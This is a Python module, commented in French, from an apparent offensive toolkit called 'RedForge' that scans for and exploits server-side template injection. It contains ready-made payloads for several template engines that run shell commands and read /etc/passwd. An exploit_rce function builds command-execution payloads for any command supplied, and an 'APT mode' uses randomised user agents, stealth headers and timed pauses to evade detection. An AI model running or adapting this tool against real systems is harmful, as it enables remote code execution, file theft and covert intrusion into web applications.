#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'injection de templates (SSTI) pour RedForge
Détecte et exploite les vulnérabilités de Server-Side Template Injection
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import base64
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class TemplateInjectionConfig:
    """Configuration avancée pour l'injection de templates"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_payloads: int = 50
    timeout: int = 10
    level: int = 3  # 1-5
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_engine: bool = True
    test_rce: bool = True
    test_blind: bool = True
    max_blind_attempts: int = 20


class TemplateInjection:
    """Détection et exploitation avancée des injections de templates (SSTI)"""
    
    def __init__(self, config: Optional[TemplateInjectionConfig] = None):
        """
        Initialise le détecteur d'injection de templates
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or TemplateInjectionConfig()
        
        # Payloads d'injection SSTI
        self.payloads = self._generate_payloads()
        
        # Signatures des moteurs de template
        self.engine_signatures = {
            "Jinja2": {
                "patterns": [r'{{.*}}', r'jinja', r'flask', r'django', r'{{config}}', r'{{self}}'],
                "math": "49",
                "detection": "{{7*7}}"
            },
            "Twig": {
                "patterns": [r'{{.*}}', r'twig', r'symfony', r'{{_self}}', r'{{_self.env}}'],
                "math": "49",
                "detection": "{{7*7}}"
            },
            "Freemarker": {
                "patterns": [r'\${.*}', r'freemarker', r'<#assign', r'\${7*7}'],
                "math": "49",
                "detection": "${7*7}"
            },
            "Velocity": {
                "patterns": [r'#set\(', r'velocity', r'\$x', r'#if\(7==7\)'],
                "math": "49",
                "detection": "#set($x=7*7)$x"
            },
            "Smarty": {
                "patterns": [r'\{php\}', r'smarty', r'{\$smarty', r'{\$.*\}'],
                "math": "49",
                "detection": "{$smarty.version}"
            },
            "ERB": {
                "patterns": [r'<%=.*%>', r'erb', r'ruby', r'rails', r'<%= 7*7 %>'],
                "math": "49",
                "detection": "<%= 7*7 %>"
            },
            "Jade/Pug": {
                "patterns": [r'#{.*}', r'jade', r'pug', r'#{7*7}'],
                "math": "49",
                "detection": "#{7*7}"
            },
            "Handlebars": {
                "patterns": [r'{{.*}}', r'handlebars', r'hbs', r'{{7*7}}'],
                "math": "49",
                "detection": "{{7*7}}"
            },
            "Mako": {
                "patterns": [r'\${.*}', r'mako', r'<%', r'\${7*7}'],
                "math": "49",
                "detection": "${7*7}"
            }
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _generate_payloads(self) -> Dict[str, List[str]]:
        """Génère une liste complète de payloads SSTI"""
        payloads = {
            "Basic Detection": [
                "{{7*7}}", "${7*7}", "{{7*'7'}}", "<%= 7*7 %>",
                "{7*7}", "*{7*7}*", "#{7*7}", "{{7*7}}",
                "${7*7}", "{{7*7}}", "{{7*7}}", "<% 7*7 %>"
            ],
            "Jinja2": [
                "{{config}}", "{{self}}", "{{config.items()}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{cycler.__init__.__globals__.os.popen('id').read()}}",
                "{{''.__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()')}}"
            ],
            "Twig": [
                "{{_self}}", "{{_self.env}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                "{{_self.env.getFilter('cat /etc/passwd')}}",
                "{{['id']|map('system')|join}}",
                "{{['cat /etc/passwd']|filter('system')}}"
            ],
            "Freemarker": [
                "${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "${.vars['freemarker.template.utility.Execute']('id')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}"
            ],
            "Velocity": [
                "#set($x=7*7)$x", "#set($x=7*7)#if($x==49)OK#end",
                "#set($e=\"java.lang.Runtime\")$e.getRuntime().exec(\"id\")",
                "#set($e=\"java.lang.Runtime\")$e.getRuntime().exec(\"cat /etc/passwd\")"
            ],
            "Smarty": [
                "{$smarty.version}", "{php}echo `id`;{/php}",
                "{$smarty.template_object->smarty->enableSecurity()->display('string:{php} echo `id`;{/php}')}",
                "{literal}<script>alert('XSS')</script>{/literal}"
            ],
            "ERB": [
                "<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>",
                "<%= File.open('/etc/passwd').read %>"
            ],
            "Mako": [
                "${7*7}", "${__import__('os').popen('id').read()}",
                "${__import__('os').popen('cat /etc/passwd').read()}"
            ],
            "Time Based": [
                "{{7*'7'}}", "{{config.items()}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd')}}"
            ]
        }
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'injection de templates
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - params: Paramètres spécifiques à tester
                - data: Données POST
                - level: Niveau d'agressivité (1-5)
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.payloads_tested = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Scan des injections de templates (SSTI) sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        tested_params = set()
        
        params_to_test = self._get_params_to_test(target, kwargs)
        post_data = kwargs.get('data')
        
        for idx, param in enumerate(params_to_test):
            if param in tested_params:
                continue
            tested_params.add(param)
            
            # Pause APT
            if self.config.apt_mode and idx > 0:
                self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            param_vulns = self._test_parameter(target, param, post_data)
            vulnerabilities.extend(param_vulns)
            
            if param_vulns:
                self.vulnerabilities_found += len(param_vulns)
                for vuln in param_vulns:
                    engine = vuln.get('template_engine', 'unknown')
                    print(f"      ✓ SSTI détectée: {param} -> {engine}")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'level' in kwargs:
            self.config.level = min(5, max(1, kwargs['level']))
        if 'max_payloads' in kwargs:
            self.config.max_payloads = kwargs['max_payloads']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.level = min(self.config.level, 3)
            self.config.max_payloads = min(self.config.max_payloads, 25)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _get_params_to_test(self, target: str, kwargs: Dict) -> List[str]:
        """Récupère la liste des paramètres à tester"""
        params = kwargs.get('params', [])
        
        if not params:
            params = self._extract_params(target)
        
        if not params:
            params = ['name', 'q', 'search', 'template', 'view', 'page', 'content',
                     'username', 'user', 'email', 'message', 'comment', 'title',
                     'body', 'text', 'html', 'markdown', 'render']
        
        # Limiter en mode APT
        if self.config.apt_mode:
            params = params[:10]
        
        return params
    
    def _extract_params(self, target: str) -> List[str]:
        """Extrait les paramètres de l'URL"""
        parsed = urlparse(target)
        if parsed.query:
            return list(parse_qs(parsed.query).keys())
        return []
    
    def _test_parameter(self, target: str, param: str, 
                        post_data: Optional[str] = None) -> List[Dict[str, Any]]:
        """Teste un paramètre pour les injections SSTI"""
        vulnerabilities = []
        
        # Phase 1: Détection basique
        for payload in self.payloads["Basic Detection"][:self.config.level * 2]:
            if self.config.random_delays:
                time.sleep(random.uniform(0.3, 0.8))
            
            result = self._test_payload(target, param, payload, post_data)
            self.payloads_tested += 1
            
            if result['vulnerable']:
                # Détection du moteur
                engine = None
                if self.config.detect_engine:
                    engine = self._detect_engine(target, param, post_data)
                
                vulnerabilities.append({
                    "parameter": param,
                    "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                    "category": "basic",
                    "severity": "CRITICAL",
                    "evidence": result['evidence'],
                    "template_engine": engine or self._infer_engine_from_payload(payload),
                    "type": result.get('type', 'reflected'),
                    "risk_score": 90
                })
                
                # Phase 2: Tests avancés spécifiques au moteur
                if engine and engine in self.payloads and self.config.test_rce:
                    adv_vulns = self._test_advanced_payloads(target, param, engine, post_data)
                    vulnerabilities.extend(adv_vulns)
                
                return vulnerabilities
        
        return vulnerabilities
    
    def _test_payload(self, target: str, param: str, payload: str,
                      post_data: Optional[str] = None) -> Dict[str, Any]:
        """Teste un payload SSTI"""
        result = {
            'vulnerable': False,
            'evidence': '',
            'type': None
        }
        
        try:
            headers = self._get_stealth_headers()
            
            if post_data:
                # Requête POST
                if isinstance(post_data, dict):
                    data_params = post_data.copy()
                else:
                    data_params = parse_qs(post_data) if post_data else {}
                    data_params = {k: v[0] if isinstance(v, list) else v for k, v in data_params.items()}
                
                data_params[param] = payload
                response = requests.post(target, data=data_params, headers=headers,
                                       timeout=self.config.timeout, verify=False)
            else:
                # Requête GET
                parsed = urlparse(target)
                query_params = parse_qs(parsed.query)
                
                if param in query_params:
                    original_value = query_params[param][0]
                    query_params[param] = [original_value + payload]
                else:
                    query_params[param] = [payload]
                
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                response = requests.get(test_url, headers=headers,
                                      timeout=self.config.timeout, verify=False)
            
            # Vérifier le résultat du calcul mathématique
            if '49' in response.text and any(x in payload for x in ['7*7', '7*\'7\'']):
                result['vulnerable'] = True
                result['evidence'] = 'math_evaluation'
                result['type'] = 'reflected'
                return result
            
            # Vérifier les erreurs de template
            template_errors = [
                'TemplateError', 'TemplateSyntaxError', 'jinja2.exceptions',
                'TemplateNotFound', 'UndefinedError', 'twig', 'freemarker',
                'Velocity', 'Smarty', 'Mako', 'ERB', 'TemplateException'
            ]
            
            for error in template_errors:
                if error.lower() in response.text.lower():
                    result['vulnerable'] = True
                    result['evidence'] = error
                    result['type'] = 'error_based'
                    return result
                    
        except Exception:
            pass
        
        return result
    
    def _detect_engine(self, target: str, param: str, 
                       post_data: Optional[str] = None) -> Optional[str]:
        """Détecte le moteur de template utilisé"""
        for engine, info in self.engine_signatures.items():
            payload = info.get("detection", "{{7*7}}")
            result = self._test_payload(target, param, payload, post_data)
            
            if result['vulnerable'] and info.get("math") in result['evidence']:
                # Vérifier avec un payload spécifique
                test_payload = f"{{{{7*'{engine}'}}}}" if engine == "Jinja2" else payload
                return engine
        
        return None
    
    def _infer_engine_from_payload(self, payload: str) -> Optional[str]:
        """Infère le moteur à partir du payload qui a fonctionné"""
        for engine, info in self.engine_signatures.items():
            for pattern in info["patterns"]:
                if re.search(pattern, payload, re.IGNORECASE):
                    return engine
        return None
    
    def _test_advanced_payloads(self, target: str, param: str, engine: str,
                                 post_data: Optional[str] = None) -> List[Dict[str, Any]]:
        """Teste des payloads avancés pour un moteur spécifique"""
        vulnerabilities = []
        
        if engine not in self.payloads:
            return vulnerabilities
        
        for payload in self.payloads[engine][:self.config.level * 2]:
            if self.config.random_delays:
                time.sleep(random.uniform(0.5, 1.0))
            
            result = self._test_payload(target, param, payload, post_data)
            self.payloads_tested += 1
            
            if result['vulnerable']:
                vulnerabilities.append({
                    "parameter": param,
                    "payload": payload[:80] + "..." if len(payload) > 80 else payload,
                    "category": engine,
                    "severity": "CRITICAL",
                    "evidence": result['evidence'],
                    "template_engine": engine,
                    "type": "advanced",
                    "risk_score": 95
                })
        
        return vulnerabilities
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        # Compter les moteurs
        engines = {}
        for v in vulnerabilities:
            engine = v.get('template_engine')
            if engine:
                engines[engine] = engines.get(engine, 0) + 1
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "engines_detected": engines,
            "payloads_tested": self.payloads_tested,
            "scan_duration": duration,
            "payloads_per_second": self.payloads_tested / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "level": self.config.level,
                "test_rce": self.config.test_rce
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities, engines)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune SSTI détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "basic": len([v for v in vulnerabilities if v['category'] == 'basic']),
                "advanced": len([v for v in vulnerabilities if v['category'] != 'basic'])
            },
            "critical": len(vulnerabilities),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict], 
                                   engines: Dict[str, int]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Ne jamais exposer de moteur de template aux utilisateurs non autorisés")
            recommendations.add("Utiliser des sandboxes ou des environnements isolés")
            recommendations.add("Échapper les entrées utilisateur avant rendu du template")
        
        for engine in engines.keys():
            if engine == "Jinja2":
                recommendations.add("Désactiver les fonctionnalités dangereuses de Jinja2")
            elif engine == "Twig":
                recommendations.add("Configurer Twig en mode sandbox")
            elif engine == "Smarty":
                recommendations.add("Désactiver les tags PHP dans Smarty")
        
        return list(recommendations)
    
    def exploit_rce(self, target: str, param: str, engine: str, 
                    command: str, post_data: Optional[str] = None) -> Dict[str, Any]:
        """
        Tente d'exécuter des commandes via SSTI
        
        Args:
            target: URL cible
            param: Paramètre vulnérable
            engine: Moteur de template
            command: Commande à exécuter
            post_data: Données POST optionnelles
        """
        rce_payloads = {
            "Jinja2": f"{{{{''.__class__.__mro__[2].__subclasses__()[40]('{command}').read()}}}}",
            "Twig": f"{{{{['{command}']|map('system')|join}}}}",
            "Freemarker": f"<#assign ex='freemarker.template.utility.Execute'?new()>${{ex('{command}')}}",
            "Velocity": f"#set($e=\"java.lang.Runtime\")$e.getRuntime().exec(\"{command}\")",
            "Smarty": f"{{php}}echo `{command}`;{{/php}}",
            "ERB": f"<%= `{command}` %>",
            "Mako": f"${{__import__('os').popen('{command}').read()}}"
        }
        
        payload = rce_payloads.get(engine)
        if not payload:
            return {"success": False, "error": f"Moteur {engine} non supporté"}
        
        result = self._test_payload(target, param, payload, post_data)
        
        return {
            "success": result['vulnerable'],
            "engine": engine,
            "command": command,
            "payload": payload,
            "evidence": result['evidence'] if result['vulnerable'] else None,
            "output": result.get('output', '')
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "payloads_tested": self.payloads_tested,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.payloads_tested) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    injection = TemplateInjection()
    results = injection.scan("https://example.com/page?name=test")
    print(f"SSTI détectées: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = TemplateInjectionConfig(apt_mode=True, level=3, max_payloads=25)
    injection_apt = TemplateInjection(config=apt_config)
    results_apt = injection_apt.scan("https://example.com/page?name=test", apt_mode=True)
    print(f"SSTI détectées (APT): {results_apt['count']}")
    print(f"Moteurs détectés: {results_apt.get('engines_detected', {})}")
    
    # Exemple d'exploitation RCE
    if results_apt['vulnerabilities']:
        vuln = results_apt['vulnerabilities'][0]
        engine = vuln.get('template_engine')
        if engine:
            rce_result = injection_apt.exploit_rce(
                "https://example.com/page",
                vuln['parameter'],
                engine,
                "id"
            )
            if rce_result['success']:
                print(f"RCE réussie sur {engine}: {rce_result.get('output', '')[:200]}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")